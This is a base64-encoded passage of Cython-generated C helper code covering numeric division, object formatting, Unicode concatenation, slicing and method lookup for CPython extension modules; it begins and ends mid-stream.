dWUob2JqKTsKICAgICAgICAgICAgZ290byBub19lcnJvcjsKICAgICAgICB9CiNlbmRpZgogICAgICAgIHZhbCA9IFB5TG9uZ19Bc0RvdWJsZShvYmopOwogICAgfSBlbHNlIGlmIChQeVVuaWNvZGVfQ2hlY2tFeGFjdChvYmopKSB7CiAgICAgICAgdmFsID0gX19QeXhfUHlVbmljb2RlX0FzRG91YmxlKG9iaik7CiAgICB9IGVsc2UgaWYgKFB5Qnl0ZXNfQ2hlY2tFeGFjdChvYmopKSB7CiAgICAgICAgdmFsID0gX19QeXhfUHlCeXRlc19Bc0RvdWJsZShvYmopOwogICAgfSBlbHNlIGlmIChQeUJ5dGVBcnJheV9DaGVja0V4YWN0KG9iaikpIHsKICAgICAgICB2YWwgPSBfX1B5eF9QeUJ5dGVBcnJheV9Bc0RvdWJsZShvYmopOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gUHlOdW1iZXJfRmxvYXQob2JqKTsKICAgIH0KICAgIGlmICh1bmxpa2VseSh2YWwgPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwpub19lcnJvcjoKI2VuZGlmCiAgICByZXR1cm4gUHlGbG9hdF9Gcm9tRG91YmxlKHZhbCk7Cn0KCgojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBpbnQgaW5wbGFjZSkgewogICAgcmV0dXJuIChpbnBsYWNlID8gUHlOdW1iZXJfSW5QbGFjZVRydWVEaXZpZGUgOiBQeU51bWJlcl9UcnVlRGl2aWRlKShvcDEsIG9wMik7Cn0KI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1VucGFja2VkX19fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGlucGxhY2UpOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDsKICAgIGxvbmcgYSwgeDsKICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNaZXJvKG9wMSkpKSB7CiAgICB9CiAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5TG9uZ19Db21wYWN0QXNMb25nKG9wMSwgJmEpKSkgewogICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKG9wMSk7CiAgICAgICAgY29uc3QgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQob3AxKTsKICAgICAgICBzd2l0Y2ggKHNpemUpIHsKICAgICAgICAgICAgY2FzZSAtMjoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQgJiYgMSAqIFB5TG9uZ19TSElGVCA8IDUzKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUICYmIDEgKiBQeUxvbmdfU0hJRlQgPCA1MykgewogICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIC0zOgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCAmJiAyICogUHlMb25nX1NISUZUIDwgNTMpIHsKICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCAmJiAyICogUHlMb25nX1NISUZUIDwgNTMpIHsKICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIC00OgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCAmJiAzICogUHlMb25nX1NISUZUIDwgNTMpIHsKICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUICYmIDMgKiBQeUxvbmdfU0hJRlQgPCA1MykgewogICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICAgICAgZGVmYXVsdDogcmV0dXJuIFB5TG9uZ19UeXBlLnRwX2FzX251bWJlci0+bmJfdHJ1ZV9kaXZpZGUob3AxLCBvcDIpOwogICAgICAgIH0KICAgIH0KICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIDw9IDUzIHx8IGxpa2VseShsYWJzKGEpIDw9ICgoUFlfTE9OR19MT05HKTEgPDwgNTMpKSkKICAgICAgICAgICAgICAgICAgICB8fCBfX1B5eF9QeUxvbmdfRGlnaXRDb3VudChvcDEpIDw9IDUyIC8gUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gUHlGbG9hdF9Gcm9tRG91YmxlKChkb3VibGUpYSAvIChkb3VibGUpYik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19UeXBlLnRwX2FzX251bWJlci0+bmJfdHJ1ZV9kaXZpZGUob3AxLCBvcDIpOwogICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoeCk7CiAgICAKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoUHlPYmplY3QgKmZsb2F0X3ZhbCwgbG9uZyBpbnR2YWwsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7CiAgICBjb25zdCBsb25nIGIgPSBpbnR2YWw7CiAgICBkb3VibGUgYSA9IF9fUHl4X1B5RmxvYXRfQVNfRE9VQkxFKGZsb2F0X3ZhbCk7CiAgICAgICAgZG91YmxlIHJlc3VsdDsKICAgICAgICAKICAgICAgICByZXN1bHQgPSAoKGRvdWJsZSlhKSAvIChkb3VibGUpYjsKICAgICAgICByZXR1cm4gUHlGbG9hdF9Gcm9tRG91YmxlKHJlc3VsdCk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGludHZhbCk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spOwogICAgI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChvcDEpKSkgewogICAgICAgIHJldHVybiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMob3AxLCBvcDIsIGludHZhbCwgaW5wbGFjZSwgemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIH0KICAgICNlbmRpZgogICAgaWYgKFB5RmxvYXRfQ2hlY2tFeGFjdChvcDEpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhvcDEsIGludHZhbCwgemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIH0KICAgIHJldHVybiBfX1B5eF9GYWxsYmFja19fX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMob3AxLCBvcDIsIGlucGxhY2UpOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRm9ybWF0KFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBmb3JtYXRfc3BlYykgewogICAgaW50IHJldDsKICAgIF9QeVVuaWNvZGVXcml0ZXIgd3JpdGVyOwogICAgaWYgKGxpa2VseShQeUZsb2F0X0NoZWNrRXhhY3Qob2JqKSkpIHsKICAgICAgICBfUHlVbmljb2RlV3JpdGVyX0luaXQoJndyaXRlcik7CiAgICAgICAgcmV0ID0gX1B5RmxvYXRfRm9ybWF0QWR2YW5jZWRXcml0ZXIoCiAgICAgICAgICAgICZ3cml0ZXIsCiAgICAgICAgICAgIG9iaiwKICAgICAgICAgICAgZm9ybWF0X3NwZWMsIDAsIFB5VW5pY29kZV9HRVRfTEVOR1RIKGZvcm1hdF9zcGVjKSk7CiAgICB9IGVsc2UgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChvYmopKSkgewogICAgICAgIF9QeVVuaWNvZGVXcml0ZXJfSW5pdCgmd3JpdGVyKTsKICAgICAgICByZXQgPSBfUHlMb25nX0Zvcm1hdEFkdmFuY2VkV3JpdGVyKAogICAgICAgICAgICAmd3JpdGVyLAogICAgICAgICAgICBvYmosCiAgICAgICAgICAgIGZvcm1hdF9zcGVjLCAwLCBQeVVuaWNvZGVfR0VUX0xFTkdUSChmb3JtYXRfc3BlYykpOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gUHlPYmplY3RfRm9ybWF0KG9iaiwgZm9ybWF0X3NwZWMpOwogICAgfQogICAgaWYgKHVubGlrZWx5KHJldCA9PSAtMSkpIHsKICAgICAgICBfUHlVbmljb2RlV3JpdGVyX0RlYWxsb2MoJndyaXRlcik7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiAgICByZXR1cm4gX1B5VW5pY29kZVdyaXRlcl9GaW5pc2goJndyaXRlcik7Cn0KI2VuZGlmCgoKIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIGludApfX1B5eF91bmljb2RlX21vZGlmaWFibGUoUHlPYmplY3QgKnVuaWNvZGUpCnsKICAgIGlmIChQeV9SRUZDTlQodW5pY29kZSkgIT0gMSkKICAgICAgICByZXR1cm4gMDsKICAgIGlmICghUHlVbmljb2RlX0NoZWNrRXhhY3QodW5pY29kZSkpCiAgICAgICAgcmV0dXJuIDA7CiAgICBpZiAoUHlVbmljb2RlX0NIRUNLX0lOVEVSTkVEKHVuaWNvZGUpKQogICAgICAgIHJldHVybiAwOwogICAgcmV0dXJuIDE7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbChQeU9iamVjdCAqKnBfbGVmdCwgUHlPYmplY3QgKnJpZ2h0CiAgICAgICAgI2lmIENZVEhPTl9SRUZOQU5OWQogICAgICAgICwgdm9pZCogX19weXhfcmVmbmFubnkKICAgICAgICAjZW5kaWYKICAgICkgewogICAgUHlPYmplY3QgKmxlZnQgPSAqcF9sZWZ0OwogICAgUHlfc3NpemVfdCBsZWZ0X2xlbiwgcmlnaHRfbGVuLCBuZXdfbGVuOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShsZWZ0KSA9PSAtMSkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHJpZ2h0KSA9PSAtMSkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBsZWZ0X2xlbiA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKGxlZnQpOwogICAgaWYgKGxlZnRfbGVuID09IDApIHsKICAgICAgICBQeV9JTkNSRUYocmlnaHQpOwogICAgICAgIHJldHVybiByaWdodDsKICAgIH0KICAgIHJpZ2h0X2xlbiA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHJpZ2h0KTsKICAgIGlmIChyaWdodF9sZW4gPT0gMCkgewogICAgICAgIFB5X0lOQ1JFRihsZWZ0KTsKICAgICAgICByZXR1cm4gbGVmdDsKICAgIH0KICAgIGlmICh1bmxpa2VseShsZWZ0X2xlbiA+IFBZX1NTSVpFX1RfTUFYIC0gcmlnaHRfbGVuKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAic3RyaW5ncyBhcmUgdG9vIGxhcmdlIHRvIGNvbmNhdCIpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgbmV3X2xlbiA9IGxlZnRfbGVuICsgcmlnaHRfbGVuOwogICAgaWYgKF9fUHl4X3VuaWNvZGVfbW9kaWZpYWJsZShsZWZ0KQogICAgICAgICAgICAmJiBQeVVuaWNvZGVfQ2hlY2tFeGFjdChyaWdodCkKICAgICAgICAgICAgJiYgUHlVbmljb2RlX0tJTkQocmlnaHQpIDw9IFB5VW5pY29kZV9LSU5EKGxlZnQpCiAgICAgICAgICAgICYmICEoUHlVbmljb2RlX0lTX0FTQ0lJKGxlZnQpICYmICFQeVVuaWNvZGVfSVNfQVNDSUkocmlnaHQpKSkgewogICAgICAgIGludCByZXQ7CiAgICAgICAgX19QeXhfR0lWRVJFRigqcF9sZWZ0KTsKICAgICAgICByZXQgPSBQeVVuaWNvZGVfUmVzaXplKHBfbGVmdCwgbmV3X2xlbik7CiAgICAgICAgX19QeXhfR09UUkVGKCpwX2xlZnQpOwogICAgICAgIGlmICh1bmxpa2VseShyZXQgIT0gMCkpCiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAgICAgaWYgKHVubGlrZWx5KFB5VW5pY29kZV9Db3B5Q2hhcmFjdGVycygqcF9sZWZ0LCBsZWZ0X2xlbiwgcmlnaHQsIDAsIHJpZ2h0X2xlbikgPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2Vsc2UKICAgICAgICBfUHlVbmljb2RlX0Zhc3RDb3B5Q2hhcmFjdGVycygqcF9sZWZ0LCBsZWZ0X2xlbiwgcmlnaHQsIDAsIHJpZ2h0X2xlbik7CiAgICAgICAgI2VuZGlmCiAgICAgICAgX19QeXhfSU5DUkVGKCpwX2xlZnQpOwogICAgICAgIF9fUHl4X0dJVkVSRUYoKnBfbGVmdCk7CiAgICAgICAgcmV0dXJuICpwX2xlZnQ7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGxlZnQsIHJpZ2h0KTsKICAgIH0KICB9CiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRTbGljZShQeU9iamVjdCogb2JqLAogICAgICAgIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLAogICAgICAgIFB5T2JqZWN0KiogX3B5X3N0YXJ0LCBQeU9iamVjdCoqIF9weV9zdG9wLCBQeU9iamVjdCoqIF9weV9zbGljZSwKICAgICAgICBpbnQgaGFzX2NzdGFydCwgaW50IGhhc19jc3RvcCwgQ1lUSE9OX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCkgewogICAgX19QeXhfVHlwZU5hbWUgb2JqX3R5cGVfbmFtZTsKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgUHlNYXBwaW5nTWV0aG9kcyogbXAgPSBQeV9UWVBFKG9iaiktPnRwX2FzX21hcHBpbmc7CiAgICBpZiAobGlrZWx5KG1wICYmIG1wLT5tcF9zdWJzY3JpcHQpKQojZW5kaWYKICAgIHsKICAgICAgICBQeU9iamVjdCogcmVzdWx0OwogICAgICAgIFB5T2JqZWN0ICpweV9zbGljZSwgKnB5X3N0YXJ0LCAqcHlfc3RvcDsKICAgICAgICBpZiAoX3B5X3NsaWNlKSB7CiAgICAgICAgICAgIHB5X3NsaWNlID0gKl9weV9zbGljZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeU9iamVjdCogb3duZWRfc3RhcnQgPSBOVUxMOwogICAgICAgICAgICBQeU9iamVjdCogb3duZWRfc3RvcCA9IE5VTEw7CiAgICAgICAgICAgIGlmIChfcHlfc3RhcnQpIHsKICAgICAgICAgICAgICAgIHB5X3N0YXJ0ID0gKl9weV9zdGFydDsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChoYXNfY3N0YXJ0KSB7CiAgICAgICAgICAgICAgICAgICAgb3duZWRfc3RhcnQgPSBweV9zdGFydCA9IFB5TG9uZ19Gcm9tU3NpemVfdChjc3RhcnQpOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RhcnQpKSBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIH0gZWxzZQogICAgICAgICAgICAgICAgICAgIHB5X3N0YXJ0ID0gUHlfTm9uZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoX3B5X3N0b3ApIHsKICAgICAgICAgICAgICAgIHB5X3N0b3AgPSAqX3B5X3N0b3A7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoaGFzX2NzdG9wKSB7CiAgICAgICAgICAgICAgICAgICAgb3duZWRfc3RvcCA9IHB5X3N0b3AgPSBQeUxvbmdfRnJvbVNzaXplX3QoY3N0b3ApOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RvcCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdGFydCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZQogICAgICAgICAgICAgICAgICAgIHB5X3N0b3AgPSBQeV9Ob25lOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHB5X3NsaWNlID0gUHlTbGljZV9OZXcocHlfc3RhcnQsIHB5X3N0b3AsIFB5X05vbmUpOwogICAgICAgICAgICBQeV9YREVDUkVGKG93bmVkX3N0YXJ0KTsKICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdG9wKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFweV9zbGljZSkpIGdvdG8gYmFkOwogICAgICAgIH0KI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgICAgIHJlc3VsdCA9IG1wLT5tcF9zdWJzY3JpcHQob2JqLCBweV9zbGljZSk7CiNlbHNlCiAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfR2V0SXRlbShvYmosIHB5X3NsaWNlKTsKI2VuZGlmCiAgICAgICAgaWYgKCFfcHlfc2xpY2UpIHsKICAgICAgICAgICAgUHlfREVDUkVGKHB5X3NsaWNlKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIG9ial90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUob2JqKSk7CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICInIiBfX1B5eF9GTVRfVFlQRU5BTUUgIicgb2JqZWN0IGlzIHVuc2xpY2VhYmxlIiwgb2JqX3R5cGVfbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqX3R5cGVfbmFtZSk7CmJhZDoKICAgIHJldHVybiBOVUxMOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncyhQeU9iamVjdCogZnVuY3Rpb24sIFB5T2JqZWN0KiBhcmcxLCBQeU9iamVjdCogYXJnMikgewogICAgUHlPYmplY3QgKmFyZ3NbM10gPSB7TlVMTCwgYXJnMSwgYXJnMn07CiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuY3Rpb24sIGFyZ3MrMSwgMiB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKiptZXRob2QpIHsKICAgIFB5T2JqZWN0ICphdHRyOwojaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTICYmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAKICAgIF9fUHl4X1R5cGVOYW1lIHR5cGVfbmFtZTsKICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7CiAgICBQeU9iamVjdCAqZGVzY3I7CiAgICBkZXNjcmdldGZ1bmMgZiA9IE5VTEw7CiAgICBQeU9iamVjdCAqKmRpY3RwdHIsICpkaWN0OwogICAgaW50IG1ldGhfZm91bmQgPSAwOwogICAgYXNzZXJ0ICgqbWV0aG9kID09IE5VTEwpOwogICAgaWYgKHVubGlrZWx5KHRwLT50cF9nZXRhdHRybyAhPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHsKICAgICAgICBhdHRyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIG5hbWUpOwogICAgICAgIGdvdG8gdHJ5X3VucGFjazsKICAgIH0KICAgIGlmICh1bmxpa2VseSh0cC0+dHBfZGljdCA9PSBOVUxMKSAmJiB1bmxpa2VseShQeVR5cGVfUmVhZHkodHApIDwgMCkpIHsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIGRlc2NyID0gX1B5VHlwZV9Mb29rdXAodHAsIG5hbWUpOwogICAgaWYgKGxpa2VseShkZXNjciAhPSBOVUxMKSkgewogICAgICAgIFB5X0lOQ1JFRihkZXNjcik7CiNpZiBkZWZpbmVkKFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IpICYmIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IKICAgICAgICBpZiAoX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoUHlfVFlQRShkZXNjciksIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IpKQojZWxzZQogICAgICAgICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKICAgICAgICBpZiAobGlrZWx5KFB5RnVuY3Rpb25fQ2hlY2soZGVzY3IpIHx8IF9fUHl4X0lTX1RZUEUoZGVzY3IsICZQeU1ldGhvZERlc2NyX1R5cGUpIHx8IF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2soZGVzY3IpKSkKICAgICAgICAjZWxzZQogICAgICAgIGlmIChsaWtlbHkoUHlGdW5jdGlvbl9DaGVjayhkZXNjcikgfHwgX19QeXhfSVNfVFlQRShkZXNjciwgJlB5TWV0aG9kRGVzY3JfVHlwZSkpKQogICAgICAgICNlbmRpZgojZW5kaWYKICAgICAgICB7CiAgICAgICAgICAgIG1ldGhfZm91bmQgPSAxOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGYgPSBQeV9UWVBFKGRlc2NyKS0+dHBfZGVzY3JfZ2V0OwogICAgICAgICAgICBpZiAoZiAhPSBOVUxMICYmIFB5RGVzY3JfSXNEYXRhKGRlc2NyKSkgewogICAgICAgICAgICAgICAgYXR0ciA9IGYoZGVzY3IsIG9iaiwgKFB5T2JqZWN0ICopUHlfVFlQRShvYmopKTsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7CiAgICAgICAgICAgICAgICBnb3RvIHRyeV91bnBhY2s7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBkaWN0cHRyID0gX1B5T2JqZWN0X0dldERpY3RQdHIob2JqKTsKICAgIGlmIChkaWN0cHRyICE9IE5VTEwgJiYgKGRpY3QgPSAqZGljdHB0cikgIT0gTlVMTCkgewogICAgICAgIFB5X0lOQ1JFRihkaWN0KTsKICAgICAgICBhdHRyID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIoZGljdCwgbmFtZSk7CiAgICAgICAgaWYgKGF0dHIgIT0gTlVMTCkgewogICAgICAgICAgICBQeV9JTkNSRUYoYXR0cik7CiAgICAgICAgICAgIFB5X0RFQ1JFRihkaWN0KTsKICAgICAgICAgICAgUHlfWERFQ1JFRihkZXNjcik7CiAgICAgICAgICAgIGdvdG8gdHJ5X3VucGFjazsKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKGRpY3QpOwogICAgfQogICAgaWYgKG1ldGhfZm91bmQpIHsKICAgICAgICAqbWV0aG9kID0gZGVzY3I7CiAgICAgICAgcmV0dXJuIDE7CiAgICB9CiAgICBpZiAoZiAhPSBOVUxMKSB7CiAgICAgICAgYXR0ciA9IGYoZGVzY3IsIG9iaiwgKFB5T2JqZWN0ICopUHlfVFlQRShvYmopKTsKICAgICAgICBQeV9ERUNSRUYoZGVzY3IpOwogICAgICAgIGdvdG8gdHJ5X3VucGFjazsKICAgIH0KICAgIGlmIChsaWtlbHkoZGVzY3IgIT0gTlVMTCkpIHsKICAgICAgICAqbWV0aG9kID0gZGVzY3I7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICB0eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKHRwKTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19BdHRyaWJ1dGVFcnJvciwKICAgICAgICAgICAgICAgICAiJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIG9iamVjdCBoYXMgbm8gYXR0cm